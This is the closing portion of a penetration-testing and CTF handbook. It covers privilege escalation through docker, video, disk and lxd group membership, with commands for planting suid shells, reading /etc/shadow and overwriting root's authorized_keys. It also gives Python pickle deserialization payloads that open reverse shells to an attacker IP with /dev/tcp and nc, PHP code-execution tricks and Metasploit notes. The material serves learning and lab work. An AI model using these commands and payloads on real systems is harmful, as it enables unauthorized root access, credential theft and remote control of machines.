<h4>Create a Dockerfile<a class="headerlink" href="#create-a-dockerfile" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mkdir docker-test
cd docker-test

cat &gt; Dockerfile
FROM debian:wheezy
ENV WORKDIR /stuff
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
</pre></div>
</div>
</section>
<section id="build-the-docker">
<h4>Build the Docker<a class="headerlink" href="#build-the-docker" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">build</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">.</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.</p>
</div>
<p><strong>Copy docker images from one host to another without via repository?</strong></p>
<p>Save the docker image as a tar file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="o">&lt;</span><span class="n">path</span> <span class="k">for</span> <span class="n">generated</span> <span class="n">tar</span> <span class="n">file</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">image</span> <span class="n">name</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">path</span> <span class="n">to</span> <span class="n">image</span> <span class="n">tar</span> <span class="n">file</span><span class="o">&gt;</span>
</pre></div>
</div>
</section>
<section id="become-root">
<h4>Become root?<a class="headerlink" href="#become-root" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Copy binaries from the container into the host and give them suid permissions:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c &#39;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#39;

./sh
whoami
# root
</pre></div>
</div>
<p>If the sh is not working, create a suid.c, compile it, suid it and run.</p>
</div></blockquote>
<ul class="simple">
<li><p>Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="n">etc</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cat shadow&#39;</span>
<span class="c1"># root:!:16364:0:99999:7:::</span>
<span class="c1"># daemon:*:16176:0:99999:7:::</span>
<span class="c1"># bin:*:16176:0:99999:7:::</span>
<span class="c1"># ...</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Bind the host’s / and overwrite system commands with rogue programs:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cp /stuff/rogue-program /stuff/bin/cat&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Privileged copy of bash for later access?</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cp /stuff/bin/bash /stuff/bin/root-shell-ftw &amp;&amp; chmod a+s /stuff/bin/root-shell-ftw&#39;</span>
<span class="n">root</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">ftw</span>  <span class="o">-</span><span class="n">p</span>
<span class="n">root</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">ftw</span><span class="o">-</span><span class="mf">4.3</span><span class="c1">#</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="video">
<h3>Video<a class="headerlink" href="#video" title="Link to this heading"></a></h3>
<p>If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at <a class="reference external" href="https://en.wikipedia.org/wiki/Linux_framebuffer">Linux Framebuffer</a> and <a class="reference external" href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">Kernel Framebuffer</a></p>
<p>If, we have access to the framebuffer device /dev/fb0. We can use a tool like <a class="reference external" href="https://github.com/AndrewFromMelbourne/fb2png">fb2png</a> to convert it to a png picture or we can cat it and get a file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">fb0</span> <span class="o">&gt;</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>

<span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4163040</span> <span class="n">May</span> <span class="mi">18</span> <span class="mi">03</span><span class="p">:</span><span class="mi">52</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>
</pre></div>
</div>
<p>To find the screen resolution, we can read virtual size</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">class</span><span class="o">/</span><span class="n">graphics</span><span class="o">/</span><span class="n">fb0</span><span class="o">/</span><span class="n">virtual_size</span>
<span class="mi">1176</span><span class="p">,</span><span class="mi">885</span>
</pre></div>
</div>
<p>We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.</p>
</section>
<section id="disk">
<h3>Disk<a class="headerlink" href="#disk" title="Link to this heading"></a></h3>
<p>Debian’s wiki says about the “disk” group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.</p>
<p>We can use debugfs command to read everything and dd command to write anywhere.</p>
<p>Read /root/.ssh/authorized_keys using debugfs:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
debugfs 1.42.13 (17-May-2015)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
</pre></div>
</div>
<p>Let’s find the block where the “/root/.ssh/authorized_keys” file resides:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs /dev/sda1 -R &quot;blocks /root/.ssh/authorized_keys&quot;
debugfs 1.42.13 (17-May-2015)
1608806
</pre></div>
</div>
<p>Let’s use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
0+1 records in
0+1 records out
394 bytes copied, 0.00239741 s, 164 kB/s
</pre></div>
</div>
<p>It’s important to sync afterwards:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ sync
</pre></div>
</div>
<p>Read again to check if the file was overwritten</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
debugfs 1.42.13 (17-May-2015)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
</pre></div>
</div>
<p>More usage details about can be found at <a class="reference external" href="https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html">debugfs Command Examples</a></p>
<section id="set-file-system">
<h4>Set file system<a class="headerlink" href="#set-file-system" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&gt;</span> <span class="n">debugfs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">hda6</span>
<span class="n">debugfs</span> <span class="mf">1.19</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Jul</span><span class="o">-</span><span class="mi">2000</span> <span class="k">for</span> <span class="n">EXT2</span> <span class="n">FS</span> <span class="mf">0.5</span><span class="n">b</span><span class="p">,</span> <span class="mi">95</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">09</span>
</pre></div>
</div>
</section>
<section id="list-files">
<h4>List files<a class="headerlink" href="#list-files" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span>  <span class="n">ls</span>
<span class="mi">2790777</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">.</span>   <span class="mi">32641</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">..</span>   <span class="mi">2790778</span> <span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="n">dir1</span>   <span class="mi">2790781</span> <span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="n">file1</span>
<span class="mi">2790782</span> <span class="p">(</span><span class="mi">4044</span><span class="p">)</span> <span class="n">file2</span>
</pre></div>
</div>
</section>
<section id="list-the-files-with-a-long-listing">
<h4>List the files with a long listing<a class="headerlink" href="#list-the-files-with-a-long-listing" title="Link to this heading"></a></h4>
<p>Format is:</p>
<ul class="simple">
<li><p>Field 1:  Inode number.</p></li>
<li><p>Field 2:  First one or two digits is the type of node:</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>2 = Character device</p></li>
<li><p>4 = Directory</p></li>
<li><p>6 = Block device</p></li>
<li><p>10 = Regular file</p></li>
<li><p>12 = Symbolic link</p></li>
<li><p>The Last four digits are the Linux permissions</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>Field 3: Owner uid</p></li>
<li><p>Field 4: Group gid</p></li>
<li><p>Field 5: Size in bytes.</p></li>
<li><p>Field 6: Date</p></li>
<li><p>Field 7: Time of last creation.</p></li>
<li><p>Field 8: Filename.</p></li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span>  <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="mi">2790777</span>  <span class="mi">40700</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">30</span> <span class="o">.</span>
 <span class="mi">32641</span>   <span class="mi">40755</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">14</span><span class="p">:</span><span class="mi">25</span> <span class="o">..</span>
<span class="mi">2790778</span>  <span class="mi">40700</span>   <span class="mi">2605</span>   <span class="mi">2601</span>    <span class="mi">4096</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="n">dir1</span>
<span class="mi">2790781</span> <span class="mi">100600</span>   <span class="mi">2605</span>   <span class="mi">2601</span>      <span class="mi">14</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">29</span> <span class="n">file1</span>
<span class="mi">2790782</span> <span class="mi">100600</span>   <span class="mi">2605</span>   <span class="mi">2601</span>      <span class="mi">14</span>  <span class="mi">5</span><span class="o">-</span><span class="n">Nov</span><span class="o">-</span><span class="mi">2001</span> <span class="mi">15</span><span class="p">:</span><span class="mi">30</span> <span class="n">file2</span>
</pre></div>
</div>
</section>
<section id="dump-the-contents-of-file1">
<h4>Dump the contents of file1<a class="headerlink" href="#dump-the-contents-of-file1" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span> <span class="n">cat</span> <span class="n">file1</span>
<span class="n">This</span> <span class="ow">is</span> <span class="n">file1</span>
</pre></div>
</div>
</section>
<section id="dump-an-inode-to-a-file">
<h4>Dump an inode to a file<a class="headerlink" href="#dump-an-inode-to-a-file" title="Link to this heading"></a></h4>
<p>Same as cat, but to a file and using inode number instead of the file name.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">debugfs</span><span class="p">:</span> <span class="n">dump</span> <span class="o">&lt;</span><span class="mi">2790782</span><span class="o">&gt;</span> <span class="n">file1</span><span class="o">-</span><span class="n">debugfs</span>
</pre></div>
</div>
<p>The above will copy the file to your file-system, useful when the flag is not in a text file and is in the jpg file or somethingelse.</p>
</section>
</section>
<section id="lxd">
<h3>LXD<a class="headerlink" href="#lxd" title="Link to this heading"></a></h3>
<p>The below has been taken from <a class="reference external" href="https://reboare.github.io/lxd/lxd-escape.html">LXD-Escape</a></p>
<p>LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.</p>
<section id="exploiting">
<h4>Exploiting<a class="headerlink" href="#exploiting" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true
Creating test

ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
Device whatever added to test

ubuntu@ubuntu:~$ lxc start test
ubuntu@ubuntu:~$ lxc exec test bash
</pre></div>
</div>
<p>Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lxc exec test bash
root@test:~# cd /mnt/root
root@test:/mnt/root# ls
bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var
boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz

root@test:/mnt/root# cd root
root@test:/mnt/root/root# ls
root@test:/mnt/root/root# touch ICanDoWhatever
root@test:/mnt/root/root# exit
exit
</pre></div>
</div>
<p>At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.</p>
</section>
</section>
</section>
<section id="appendix-v-coding-languages-tricks">
<span id="a5-coding-languages-tricks"></span><h2>Appendix-V Coding Languages Tricks<a class="headerlink" href="#appendix-v-coding-languages-tricks" title="Link to this heading"></a></h2>
<section id="id44">
<h3>Python<a class="headerlink" href="#id44" title="Link to this heading"></a></h3>
<section id="pickle">
<h4>Pickle<a class="headerlink" href="#pickle" title="Link to this heading"></a></h4>
<p>If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>
</div>
<p>The pickle website say <em>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</em></p>
<p>we may use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Shell_code</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;/bin/bash -i &gt;&amp; /dev/tcp/&quot;Client IP&quot;/&quot;Listening PORT&quot; 0&gt;&amp;1&#39;</span><span class="p">,))</span>
   <span class="ow">or</span>   <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;</span><span class="p">,))</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Shell_code</span><span class="p">())</span>
</pre></div>
</div>
<p>if we print shell variable above, it would look something like below if python version 2 is used</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cposix</span>
<span class="n">system</span>
<span class="n">p1</span>
<span class="p">(</span><span class="n">S</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.XX 4444 &gt;/tmp/f&#39;</span>
<span class="n">p2</span>
<span class="n">tp3</span>
<span class="n">Rp4</span>
<span class="o">.</span>
</pre></div>
</div>
<p>and in python version 3</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x03</span><span class="s1">cposix</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">XT</span><span class="se">\x00\x00\x00</span><span class="s1">/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/fq</span><span class="se">\x01\x85</span><span class="s1">q</span><span class="se">\x02</span><span class="s1">Rq</span><span class="se">\x03</span><span class="s1">.&#39;</span>
</pre></div>
</div>
<p>Pickle is imported in python 3 as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">_pickle</span> <span class="k">as</span> <span class="nn">cPickle</span>
</pre></div>
</div>
<p>and in python 2</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">cPickle</span>
</pre></div>
</div>
<p>Now, we can test locally that our code for shell is working by unpickling by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#data.txt containing our Pickled data</span>
<span class="kn">import</span> <span class="nn">cPickle</span>
<span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;/tmp/data.txt&quot;</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>
</div>
<p>Refer <a class="reference external" href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely</a> , <a class="reference external" href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">Sour Pickles</a> and <a class="reference external" href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Exploiting misuse of Python’s “pickle”</a></p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.</p>
</div>
</section>
</section>
<section id="id45">
<h3>PHP<a class="headerlink" href="#id45" title="Link to this heading"></a></h3>
<section id="preg-replace">
<h4>Preg_Replace<a class="headerlink" href="#preg-replace" title="Link to this heading"></a></h4>
<p>PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a> Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.</p>
</section>
<section id="complex-curly-syntax">
<h4>Complex Curly Syntax<a class="headerlink" href="#complex-curly-syntax" title="Link to this heading"></a></h4>
<p>PHP has <a class="reference external" href="http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a> The Complex Syntax to allow evaluation of our own code in double quotes.</p>
<p>Example</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$use_me = &quot;ls -lah&quot;
{${system($use_me)}}
</pre></div>
</div>
<p>This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).</p>
</section>
<section id="xdebug">
<h4>Xdebug<a class="headerlink" href="#xdebug" title="Link to this heading"></a></h4>
<p>If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer <a class="reference external" href="https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/">xpwn - exploiting xdebug enabled servers</a>  and <a class="reference external" href="https://github.com/gteissier/xdebug-shell">xdebug-shell</a></p>
</section>
<section id="type-juggling-magic-bytes">
<h4>Type Juggling/ Magic Bytes<a class="headerlink" href="#type-juggling-magic-bytes" title="Link to this heading"></a></h4>
<p>Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at <a class="reference external" href="http://php.net/manual/en/language.operators.comparison.php">Language Operators Comparison</a></p>
<p><em>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.</em></p>
<p>So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.</p>
<p>Refer <a class="reference external" href="https://www.whitehatsec.com/blog/magic-hashes/">Magic Hashes</a>, <a class="reference external" href="https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#">PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing</a> and <a class="reference external" href="http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Writing Exploits For Exotic Bug Classes:
PHP Type Juggling</a></p>
</section>
</section>
<section id="id47">
<h3>LUA<a class="headerlink" href="#id47" title="Link to this heading"></a></h3>
<p>In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is <a class="reference external" href="http://seclists.org/fulldisclosure/2014/May/128">Lua Web Application Security Vulnerabilities</a></p>
</section>
</section>
<section id="appendix-vi-metasploit-module-writing">
<h2>Appendix-VI Metasploit Module Writing?<a class="headerlink" href="#appendix-vi-metasploit-module-writing" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This section is still under progress.</p>
</div>
<ul>
<li><p>Creating a new module? create it in your home directory</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mkdir -p $HOME/.msf4/modules/exploits
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>If you are using auxiliary or post modules, or are writing payloads you’ll want to mkdir those as well.</p>
</div></blockquote>
<ul>
<li><p>Made some changes and want metasploit to pick up those changes? use</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">reload_all</span>
</pre></div>
</div>
</li>
<li><p>Refer <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules">Loading External Modules</a> for the above two points.</p></li>
<li><p>Want to edit a module or see the source code of it ? use edit in msfconsole (after selecting the module i.e use module_name)</p></li>
<li><p>Want to write some variable value (like the payload/ mof file) to a file? use</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">File</span><span class="o">.</span><span class="n">Write</span><span class="p">(</span><span class="s1">&#39;/path/to/file&#39;</span><span class="p">,</span> <span class="s1">&#39;Some glorious content&#39;</span><span class="p">)</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Refer <a class="reference external" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/">Documentation for rapid7/metasploit-framework</a></p></li>
<li><p>Refer <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows">How to use WbemExec for a write privilege attack on Windows</a> and <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit">How to get started with writing an exploit</a></p></li>
</ul>
</section>
<section id="changelog">
<h2>Changelog<a class="headerlink" href="#changelog" title="Link to this heading"></a></h2>
</section>
</section>


           </div>
          </div>
          <footer>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
  </div>

   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(false);
      });
  </script> 

</body>
</html>